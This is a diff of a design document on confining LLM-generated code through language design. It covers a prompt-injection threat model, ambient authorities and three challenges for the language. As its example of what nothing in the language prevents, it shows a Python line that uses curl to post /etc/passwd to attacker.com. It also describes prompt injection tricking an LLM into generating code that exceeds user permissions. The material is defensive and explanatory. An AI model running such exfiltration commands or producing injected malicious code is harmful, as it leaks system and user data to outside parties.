@@ -1,12 +1,17 @@
 # The AI Security Problem
 
-Large-language models (LLMs) are extremely powerful at generating code to automate tasks. However, cloud platforms cannot fully embrace this power: through _prompt injection_ a user can trick the LLM to generate malicious code that endangers the platform.
+Large-language models can generate code to automate tasks with unconstrained capability.
+But cloud platforms cannot fully embrace this power: through _prompt injection_, a
+malicious user can trick the LLM into generating code that exceeds the user's authorized
+permissions — exfiltrating other users' data, escalating privileges, or calling out to
+attacker-controlled endpoints.
 
 ## Threat Model
 
 **Attacker**: A malicious user who crafts prompts to manipulate LLM-generated code.
 
-**Attack vector**: Prompt injection causes the LLM to generate code that exceeds the user's authorized permissions.
+**Attack vector**: Prompt injection causes the LLM to generate code that exceeds the
+user's authorized permissions.
 
 **Attacker goals**:
 
@@ -14,7 +19,8 @@ Large-language models (LLMs) are extremely powerful at generating code to automa
 - Escalate privileges beyond granted permissions
 - Exfiltrate data to external endpoints
 
-**Trust boundary**: The interface between platform-provided APIs and LLM-generated code. Platform API implementation is trusted; LLM-generated code is untrusted.
+**Trust boundary**: The interface between platform-provided APIs and LLM-generated code.
+Platform API implementation is trusted; LLM-generated code is untrusted.
 
 ## Ambient Authorities
 
@@ -26,92 +32,42 @@ Nearly all popular languages expose powerful ambient authorities to programs:
 - System calls
 - Foreign Function Interface (FFI)
 - Reflective language features
-- Control flow effects (exceptions, setjmp/longjmp)
 
-
-With such powerful authorities, a program or a function can potentially do anything.
-A malicious program with such authorities can steal all the data and hijack the platform.
-
-Consider a task: "read file `report.txt` and summarize it." In Python:
+With such authorities, a program can potentially do anything. The problem is
+structural — not a bug in any specific program:
 
 ```python
 # Intended behavior
 content = open("report.txt").read()
 
-# But nothing prevents this:
+# Nothing in the language prevents this:
 import os
 os.system("curl -X POST https://attacker.com -d @/etc/passwd")
 ```
 
-The ambient authorities (`os`, `open`, network access) make confinement impossible at the language level.
+The ambient authorities (`os`, `open`, network access) make confinement impossible at
+the language level.
 
-## The Authority Confinement Problem
+## Three Challenges
 
-What we really want is to confine the behaviors of a LLM-generated program according to specific _security context_.
-For cloud platforms, the security context at least contains the current user.
-The LLM-generated code for the user should be at least confined to the current user's permissions on the platform.
+Securing AI-generated code requires solving three distinct problems:
 
-It is easy for a platform to specify and implement security-context-aware APIs as a library in a language.
-However, even if the API design follows the _principle of least privilege_,
-none of the popular languages can enforce that untrusted code is confined to the APIs due to the ubiquity of ambient authorities.
+**Challenge 1 — Usability without ambient authorities.** A secure language must remove
+ambient authorities, but doing so naively means threading every capability through every
+function call. The language needs a way to propagate authorities implicitly while keeping
+them statically trackable — so the common case is ergonomic but every authority is
+auditable.
 
-In fact, the authority confinement problem is a language design challenge:
+**Challenge 2 — Security context representation.** The authority given to untrusted code
+must encode the current user — not just "database access" but "this user's rows only."
+The security context must be abstract: untrusted code cannot inspect, forge, or amplify
+it. This requires both a representation mechanism and type-system enforcement of
+abstraction boundaries.
 
-- How to remove all ambient authorities (any backdoor breaks security) and still make the language easy to use?
-- How to represent the security context such that it is invisible to untrusted code while visible in the trusted API implementation?
-- How to make the powerful authorities inaccessible to untrusted code while accessible to trusted API implementation?
+**Challenge 3 — Authority attenuation.** Trusted code holds broad authorities; untrusted
+code should receive only the narrow slice it needs. The language must support deriving
+fine-grained authorities from coarse ones, with a guarantee that the coarse authority
+cannot be recovered through the derived one. Languages with reflection or object
+inspection (Java, JavaScript) defeat this guarantee.
 
-We discuss the three challenges in details below.
-
-## Authorities and Usability
-
-The reason why all popular languages introduce ambient authorities is to
-simplify usage.  Imagine a language where all ambient authorities are removed
-and there are no global variables, then a lot of authorities need to thread
-through in the program to the places where they are used. This creates
-significant boilerplate and incurs overhead on programmers.
-
-Yes, a secure language must remove ambient authorities.  However, there should
-be a convenient way to control and pass authorities in a program. Ideally, the
-control should be enforced by the type system and all violations should be
-detected at compile-time. The passing of authorities should be mostly automatic
-in the call chain except for control gates (similar to airport check).
-
-Meanwhile, a practical secure language must enable gradual tightening of
-security rules in the development process. For exemple, during prototyping
-programmers might prefer coarse-grained authorities over fine-grained
-authorities, or even completely disregard security to avoid premature
-optimization.  However, the secure language should enable gradual and smooth
-transition from an insecure prototype to a secure system without big
-refactoring pains.
-
-## Security Context
-
-The security context problem has two dimensions:
-
-- **Representation**: how to represent the security context
-
-- **Encapsulation**: how to make the security context invisible to untrusted code
-
-To represent security contexts, the authorities provided to the untrusted
-program should be stateful. They cannot be just addresses of functions.
-
-To defend against manipulation or forgery of the security context, an easy
-solution is to make the authorities abstract and the abstraction should be
-protected by a static type system.
-
-
-## Attenuation of Authorities
-
-To differentiate the authorities given to trusted/untrusted code and follow the
-principle of least privilege, we need
-to attenuate the authorities when crossing the trust boundary.
-To make attenuation of authorities effective, we need
-
-- a mechanism to define fine-grained authorities from coarse-grained authorities, and
-- a guarantee that the coarse-grained authorities will not leak via the derived fine-grained authorities
-
-The coarse-grained authorities can leak via the fine-grained authorities if the
-language supports Java-like reflection or JavaScript-like object inspection.
-
-For a practical solution to the authority confinement problem, see [Jo's Solution](solution.md).
+See [Two-World Architecture](two-worlds.md) for the structural mechanism that makes the guarantees possible, and [Language Design](language-design.md) for the language facilities that address each challenge.
